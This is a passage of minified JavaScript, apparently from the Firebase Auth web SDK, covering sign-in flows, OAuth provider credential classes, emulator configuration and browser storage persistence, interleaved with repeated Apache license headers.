s,o;if(i==="EMAIL_PASSWORD_PROVIDER")if(!((s=n._getRecaptchaConfig())===null||s===void 0)&&s.isProviderEnabled("EMAIL_PASSWORD_PROVIDER")){const a=await zc(n,e,t,t==="getOobCode");return r(n,a)}else return r(n,e).catch(async a=>{if(a.code==="auth/missing-recaptcha-token"){console.log(`${t} is protected by reCAPTCHA Enterprise for this project. Automatically triggering the reCAPTCHA flow and restarting the flow.`);const l=await zc(n,e,t,t==="getOobCode");return r(n,l)}else return Promise.reject(a)});else if(i==="PHONE_PROVIDER")if(!((o=n._getRecaptchaConfig())===null||o===void 0)&&o.isProviderEnabled("PHONE_PROVIDER")){const a=await zc(n,e,t);return r(n,a).catch(async l=>{var u;if(((u=n._getRecaptchaConfig())===null||u===void 0?void 0:u.getProviderEnforcementState("PHONE_PROVIDER"))==="AUDIT"&&(l.code==="auth/missing-recaptcha-token"||l.code==="auth/invalid-app-credential")){console.log(`Failed to verify with reCAPTCHA Enterprise. Automatically triggering the reCAPTCHA v2 flow to complete the ${t} flow.`);const h=await zc(n,e,t,!1,!0);return r(n,h)}return Promise.reject(l)})}else{const a=await zc(n,e,t,!1,!0);return r(n,a)}else return Promise.reject(i+" provider is not supported.")}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function j8(n,e){const t=Sv(n,"auth");if(t.isInitialized()){const i=t.getImmediate(),s=t.getOptions();if(da(s,e??{}))return i;mi(i,"already-initialized")}return t.initialize({options:e})}function V8(n,e){const t=(e==null?void 0:e.persistence)||[],r=(Array.isArray(t)?t:[t]).map(is);e!=null&&e.errorMap&&n._updateErrorMap(e.errorMap),n._initializeWithPersistence(r,e==null?void 0:e.popupRedirectResolver)}function F8(n,e,t){const r=hc(n);Me(/^https?:\/\//.test(e),r,"invalid-emulator-scheme");const i=!!(t!=null&&t.disableWarnings),s=F2(e),{host:o,port:a}=z8(e),l=a===null?"":`:${a}`,u={url:`${s}//${o}${l}/`},h=Object.freeze({host:o,port:a,protocol:s.replace(":",""),options:Object.freeze({disableWarnings:i})});if(!r._canInitEmulator){Me(r.config.emulator&&r.emulatorConfig,r,"emulator-config-failed"),Me(da(u,r.config.emulator)&&da(h,r.emulatorConfig),r,"emulator-config-failed");return}r.config.emulator=u,r.emulatorConfig=h,r.settings.appVerificationDisabledForTesting=!0,i||W8()}function F2(n){const e=n.indexOf(":");return e<0?"":n.substr(0,e+1)}function z8(n){const e=F2(n),t=/(\/\/)?([^?#/]+)/.exec(n.substr(e.length));if(!t)return{host:"",port:null};const r=t[2].split("@").pop()||"",i=/^(\[[^\]]+\])(:|$)/.exec(r);if(i){const s=i[1];return{host:s,port:II(r.substr(s.length+1))}}else{const[s,o]=r.split(":");return{host:s,port:II(o)}}}function II(n){if(!n)return null;const e=Number(n);return isNaN(e)?null:e}function W8(){function n(){const e=document.createElement("p"),t=e.style;e.innerText="Running in emulator mode. Do not use with production credentials.",t.position="fixed",t.width="100%",t.backgroundColor="#ffffff",t.border=".1em solid #000000",t.color="#b50000",t.bottom="0px",t.left="0px",t.margin="0px",t.zIndex="10000",t.textAlign="center",e.classList.add("firebase-emulator-warning"),document.body.appendChild(e)}typeof console<"u"&&typeof console.info=="function"&&console.info("WARNING: You are using the Auth Emulator, which is intended for local testing only.  Do not use with production credentials."),typeof window<"u"&&typeof document<"u"&&(document.readyState==="loading"?window.addEventListener("DOMContentLoaded",n):n())}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Cv{constructor(e,t){this.providerId=e,this.signInMethod=t}toJSON(){return rs("not implemented")}_getIdTokenResponse(e){return rs("not implemented")}_linkToIdToken(e,t){return rs("not implemented")}_getReauthenticationResolver(e){return rs("not implemented")}}async function $8(n,e){return bo(n,"POST","/v1/accounts:signUp",e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function H8(n,e){return qp(n,"POST","/v1/accounts:signInWithPassword",ba(n,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function q8(n,e){return qp(n,"POST","/v1/accounts:signInWithEmailLink",ba(n,e))}async function K8(n,e){return qp(n,"POST","/v1/accounts:signInWithEmailLink",ba(n,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Qu extends Cv{constructor(e,t,r,i=null){super("password",r),this._email=e,this._password=t,this._tenantId=i}static _fromEmailAndPassword(e,t){return new Qu(e,t,"password")}static _fromEmailAndCode(e,t,r=null){return new Qu(e,t,"emailLink",r)}toJSON(){return{email:this._email,password:this._password,signInMethod:this.signInMethod,tenantId:this._tenantId}}static fromJSON(e){const t=typeof e=="string"?JSON.parse(e):e;if(t!=null&&t.email&&(t!=null&&t.password)){if(t.signInMethod==="password")return this._fromEmailAndPassword(t.email,t.password);if(t.signInMethod==="emailLink")return this._fromEmailAndCode(t.email,t.password,t.tenantId)}return null}async _getIdTokenResponse(e){switch(this.signInMethod){case"password":const t={returnSecureToken:!0,email:this._email,password:this._password,clientType:"CLIENT_TYPE_WEB"};return EI(e,t,"signInWithPassword",H8,"EMAIL_PASSWORD_PROVIDER");case"emailLink":return q8(e,{email:this._email,oobCode:this._password});default:mi(e,"internal-error")}}async _linkToIdToken(e,t){switch(this.signInMethod){case"password":const r={idToken:t,returnSecureToken:!0,email:this._email,password:this._password,clientType:"CLIENT_TYPE_WEB"};return EI(e,r,"signUpPassword",$8,"EMAIL_PASSWORD_PROVIDER");case"emailLink":return K8(e,{idToken:t,email:this._email,oobCode:this._password});default:mi(e,"internal-error")}}_getReauthenticationResolver(e){return this._getIdTokenResponse(e)}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function bl(n,e){return qp(n,"POST","/v1/accounts:signInWithIdp",ba(n,e))}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const G8="http://localhost";class ga extends Cv{constructor(){super(...arguments),this.pendingToken=null}static _fromParams(e){const t=new ga(e.providerId,e.signInMethod);return e.idToken||e.accessToken?(e.idToken&&(t.idToken=e.idToken),e.accessToken&&(t.accessToken=e.accessToken),e.nonce&&!e.pendingToken&&(t.nonce=e.nonce),e.pendingToken&&(t.pendingToken=e.pendingToken)):e.oauthToken&&e.oauthTokenSecret?(t.accessToken=e.oauthToken,t.secret=e.oauthTokenSecret):mi("argument-error"),t}toJSON(){return{idToken:this.idToken,accessToken:this.accessToken,secret:this.secret,nonce:this.nonce,pendingToken:this.pendingToken,providerId:this.providerId,signInMethod:this.signInMethod}}static fromJSON(e){const t=typeof e=="string"?JSON.parse(e):e,{providerId:r,signInMethod:i}=t,s=Tv(t,["providerId","signInMethod"]);if(!r||!i)return null;const o=new ga(r,i);return o.idToken=s.idToken||void 0,o.accessToken=s.accessToken||void 0,o.secret=s.secret,o.nonce=s.nonce,o.pendingToken=s.pendingToken||null,o}_getIdTokenResponse(e){const t=this.buildRequest();return bl(e,t)}_linkToIdToken(e,t){const r=this.buildRequest();return r.idToken=t,bl(e,r)}_getReauthenticationResolver(e){const t=this.buildRequest();return t.autoCreate=!1,bl(e,t)}buildRequest(){const e={requestUri:G8,returnSecureToken:!0};if(this.pendingToken)e.pendingToken=this.pendingToken;else{const t={};this.idToken&&(t.id_token=this.idToken),this.accessToken&&(t.access_token=this.accessToken),this.secret&&(t.oauth_token_secret=this.secret),t.providerId=this.providerId,this.nonce&&!this.pendingToken&&(t.nonce=this.nonce),e.postBody=yh(t)}return e}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Q8(n){switch(n){case"recoverEmail":return"RECOVER_EMAIL";case"resetPassword":return"PASSWORD_RESET";case"signIn":return"EMAIL_SIGNIN";case"verifyEmail":return"VERIFY_EMAIL";case"verifyAndChangeEmail":return"VERIFY_AND_CHANGE_EMAIL";case"revertSecondFactorAddition":return"REVERT_SECOND_FACTOR_ADDITION";default:return null}}function Y8(n){const e=Qc(Yc(n)).link,t=e?Qc(Yc(e)).deep_link_id:null,r=Qc(Yc(n)).deep_link_id;return(r?Qc(Yc(r)).link:null)||r||t||e||n}class Rv{constructor(e){var t,r,i,s,o,a;const l=Qc(Yc(e)),u=(t=l.apiKey)!==null&&t!==void 0?t:null,h=(r=l.oobCode)!==null&&r!==void 0?r:null,f=Q8((i=l.mode)!==null&&i!==void 0?i:null);Me(u&&h&&f,"argument-error"),this.apiKey=u,this.operation=f,this.code=h,this.continueUrl=(s=l.continueUrl)!==null&&s!==void 0?s:null,this.languageCode=(o=l.languageCode)!==null&&o!==void 0?o:null,this.tenantId=(a=l.tenantId)!==null&&a!==void 0?a:null}static parseLink(e){const t=Y8(e);try{return new Rv(t)}catch{return null}}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class fc{constructor(){this.providerId=fc.PROVIDER_ID}static credential(e,t){return Qu._fromEmailAndPassword(e,t)}static credentialWithLink(e,t){const r=Rv.parseLink(t);return Me(r,"argument-error"),Qu._fromEmailAndCode(e,r.code,r.tenantId)}}fc.PROVIDER_ID="password";fc.EMAIL_PASSWORD_SIGN_IN_METHOD="password";fc.EMAIL_LINK_SIGN_IN_METHOD="emailLink";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class z2{constructor(e){this.providerId=e,this.defaultLanguageCode=null,this.customParameters={}}setDefaultLanguage(e){this.defaultLanguageCode=e}setCustomParameters(e){return this.customParameters=e,this}getCustomParameters(){return this.customParameters}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class vh extends z2{constructor(){super(...arguments),this.scopes=[]}addScope(e){return this.scopes.includes(e)||this.scopes.push(e),this}getScopes(){return[...this.scopes]}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Bs extends vh{constructor(){super("facebook.com")}static credential(e){return ga._fromParams({providerId:Bs.PROVIDER_ID,signInMethod:Bs.FACEBOOK_SIGN_IN_METHOD,accessToken:e})}static credentialFromResult(e){return Bs.credentialFromTaggedObject(e)}static credentialFromError(e){return Bs.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e||!("oauthAccessToken"in e)||!e.oauthAccessToken)return null;try{return Bs.credential(e.oauthAccessToken)}catch{return null}}}Bs.FACEBOOK_SIGN_IN_METHOD="facebook.com";Bs.PROVIDER_ID="facebook.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Us extends vh{constructor(){super("google.com"),this.addScope("profile")}static credential(e,t){return ga._fromParams({providerId:Us.PROVIDER_ID,signInMethod:Us.GOOGLE_SIGN_IN_METHOD,idToken:e,accessToken:t})}static credentialFromResult(e){return Us.credentialFromTaggedObject(e)}static credentialFromError(e){return Us.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e)return null;const{oauthIdToken:t,oauthAccessToken:r}=e;if(!t&&!r)return null;try{return Us.credential(t,r)}catch{return null}}}Us.GOOGLE_SIGN_IN_METHOD="google.com";Us.PROVIDER_ID="google.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class js extends vh{constructor(){super("github.com")}static credential(e){return ga._fromParams({providerId:js.PROVIDER_ID,signInMethod:js.GITHUB_SIGN_IN_METHOD,accessToken:e})}static credentialFromResult(e){return js.credentialFromTaggedObject(e)}static credentialFromError(e){return js.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e||!("oauthAccessToken"in e)||!e.oauthAccessToken)return null;try{return js.credential(e.oauthAccessToken)}catch{return null}}}js.GITHUB_SIGN_IN_METHOD="github.com";js.PROVIDER_ID="github.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Vs extends vh{constructor(){super("twitter.com")}static credential(e,t){return ga._fromParams({providerId:Vs.PROVIDER_ID,signInMethod:Vs.TWITTER_SIGN_IN_METHOD,oauthToken:e,oauthTokenSecret:t})}static credentialFromResult(e){return Vs.credentialFromTaggedObject(e)}static credentialFromError(e){return Vs.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e)return null;const{oauthAccessToken:t,oauthTokenSecret:r}=e;if(!t||!r)return null;try{return Vs.credential(t,r)}catch{return null}}}Vs.TWITTER_SIGN_IN_METHOD="twitter.com";Vs.PROVIDER_ID="twitter.com";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ql{constructor(e){this.user=e.user,this.providerId=e.providerId,this._tokenResponse=e._tokenResponse,this.operationType=e.operationType}static async _fromIdTokenResponse(e,t,r,i=!1){const s=await li._fromIdTokenResponse(e,r,i),o=SI(r);return new ql({user:s,providerId:o,_tokenResponse:r,operationType:t})}static async _forOperation(e,t,r){await e._updateTokensIfNecessary(r,!0);const i=SI(r);return new ql({user:e,providerId:i,_tokenResponse:r,operationType:t})}}function SI(n){return n.providerId?n.providerId:"phoneNumber"in n?"phone":null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Vd extends Es{constructor(e,t,r,i){var s;super(t.code,t.message),this.operationType=r,this.user=i,Object.setPrototypeOf(this,Vd.prototype),this.customData={appName:e.name,tenantId:(s=e.tenantId)!==null&&s!==void 0?s:void 0,_serverResponse:t.customData._serverResponse,operationType:r}}static _fromErrorAndOperation(e,t,r,i){return new Vd(e,t,r,i)}}function W2(n,e,t,r){return(e==="reauthenticate"?t._getReauthenticationResolver(n):t._getIdTokenResponse(n)).catch(s=>{throw s.code==="auth/multi-factor-auth-required"?Vd._fromErrorAndOperation(n,s,e,r):s})}async function Z8(n,e,t=!1){const r=await Gu(n,e._linkToIdToken(n.auth,await n.getIdToken()),t);return ql._forOperation(n,"link",r)}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function J8(n,e,t=!1){const{auth:r}=n;if(oi(r.app))return Promise.reject(co(r));const i="reauthenticate";try{const s=await Gu(n,W2(r,i,e,n),t);Me(s.idToken,r,"internal-error");const o=xv(s.idToken);Me(o,r,"internal-error");const{sub:a}=o;return Me(n.uid===a,r,"user-mismatch"),ql._forOperation(n,i,s)}catch(s){throw(s==null?void 0:s.code)==="auth/user-not-found"&&mi(r,"user-mismatch"),s}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function $2(n,e,t=!1){if(oi(n.app))return Promise.reject(co(n));const r="signIn",i=await W2(n,r,e),s=await ql._fromIdTokenResponse(n,r,i);return t||await n._updateCurrentUser(s.user),s}async function X8(n,e){return $2(hc(n),e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function ej(n){const e=hc(n);e._getPasswordPolicyInternal()&&await e._updatePasswordPolicy()}function tj(n,e,t){return oi(n.app)?Promise.reject(co(n)):X8(xn(n),fc.credential(e,t)).catch(async r=>{throw r.code==="auth/password-does-not-meet-requirements"&&ej(n),r})}function nj(n,e,t,r){return xn(n).onIdTokenChanged(e,t,r)}function rj(n,e,t){return xn(n).beforeAuthStateChanged(e,t)}function ij(n,e,t,r){return xn(n).onAuthStateChanged(e,t,r)}function sj(n){return xn(n).signOut()}const Fd="__sak";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class H2{constructor(e,t){this.storageRetriever=e,this.type=t}_isAvailable(){try{return this.storage?(this.storage.setItem(Fd,"1"),this.storage.removeItem(Fd),Promise.resolve(!0)):Promise.resolve(!1)}catch{return Promise.resolve(!1)}}_set(e,t){return this.storage.setItem(e,JSON.stringify(t)),Promise.resolve()}_get(e){const t=this.storage.getItem(e);return Promise.resolve(t?JSON.parse(t):null)}_remove(e){return this.storage.removeItem(e),Promise.resolve()}get storage(){return this.storageRetriever()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const oj=1e3,aj=10;class q2 extends H2{constructor(){super(()=>window.localStorage,"LOCAL"),this.boundEventHandler=(e,t)=>this.onStorageEvent(e,t),this.listeners={},this.localCache={},this.pollTimer=null,this.fallbackToPolling=B2(),this._shouldAllowMigration=!0}forAllChangedKeys(e){for(const t of Object.keys(this.listeners)){const r=this.storage.getItem(t),i=this.localCache[t];r!==i&&e(t,i,r)}}onStorageEvent(e,t=!1){if(!e.key){this.forAllChangedKeys((o,a,l)=>{this.notifyListeners(o,l)});return}const r=e.key;t?this.detachListener():this.stopPolling();const i=()=>{const o=this.storage.getItem(r);!t&&this.localCache[r]===o||this.notifyListeners(r,o)},s=this.storage.getItem(r);A8()&&s!==e.newValue&&e.newValue!==e.oldValue?setTimeout(i,aj):i()}notifyListeners(e,t){this.localCache[e]=t;const r=this.listeners[e];if(r)for(const i of Array.from(r))i(t&&JSON.parse(t))}startPolling(){this.stopPolling(),this.pollTimer=setInterval(()=>{this.forAllChangedKeys((e,t,r)=>{this.onStorageEvent(new StorageEvent("storage",{key:e,oldValue:t,newValue:r}),!0)})},oj)}stopPolling(){this.pollTimer&&(clearInterval(this.pollTimer),this.pollTimer=null)}attachListener(){window.addEventListener("storage",this.boundEventHandler)}detachListener(){window.removeEventListener("storage",this.boundEventHandler)}_addListener(e,t){Object.keys(this.listeners).length===0&&(this.fallbackToPolling?this.startPolling():this.attachListener()),this.listeners[e]||(this.listeners[e]=new Set,this.localCache[e]=this.storage.getItem(e)),this.listeners[e].add(t)}_removeListener(e,t){this.listeners[e]&&(this.listeners[e].delete(t),this.listeners[e].size===0&&delete this.listeners[e]),Object.keys(this.listeners).length===0&&(this.detachListener(),this.stopPolling())}async _set(e,t){await super._set(e,t),this.localCache[e]=JSON.stringify(t)}async _get(e){const t=await super._get(e);return this.localCache[e]=JSON.stringify(t),t}async _remove(e){await super._remove(e),delete this.localCache[e]}}q2.type="LOCAL";const lj=q2;/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class K2 extends H2{constructor(){super(()=>window.sessionStorage,"SESSION")}_addListener(e,t){}_removeListener(e,t){}}K2.type="SESSION";const G2=K2;/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function cj(n){return Promise.all(n.map(async e=>{try{return{fulfilled:!0,value:await e}}catch(t){return{fulfilled:!1,reason:t}}}))}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Gp{constructor(e){this.eventTarget=e,this.handlersMap={},this.boundEventHandler=this.handleEvent.bind(this)}static _getInstance(e){const t=this.receivers.find(i=>i.isListeningto(e));if(t)return t;const r=new Gp(e);return this.receivers.push(r),r}isListeningto(e){return this.eventTarget===e}async handleEvent(e){const t=e,{eventId:r,eventType:i,data:s}=t.data,o=this.handlersMap[i];if(!(o!=null&&o.size))return;t.ports[0].postMessage({status:"ack",eventId:r,eventType:i});const a=Array.from(o).map(async u=>u(t.origin,s)),l=await cj(a);t.ports[0].postMessage({status:"done",eventId:r,eventType:i,response:l})}_subscribe(e,t){Object.keys(this.handlersMap).length===0&&this.eventTarget.addEventListener("message",this.boundEventHandler),this.handlersMap[e]||(this.handlersMap[e]=new Set),this.handlersMap[e].add(t)}_unsubscribe(e,t){this.handlersMap[e]&&t&&this.handlersMap[e].delete(t),(!t||this.handlersMap[e].size===0)&&delete this.handlersMap[e],Object.keys(this.handlersMap).length===0&&this.eventTarget.removeEventListener("message",this.boundEventHandler)}}Gp.receivers=[];/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Mv(n="",e=10){let t="";for(let r=0;r<e;r++)t+=Math.floor(Math.random()*10);return n+t}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
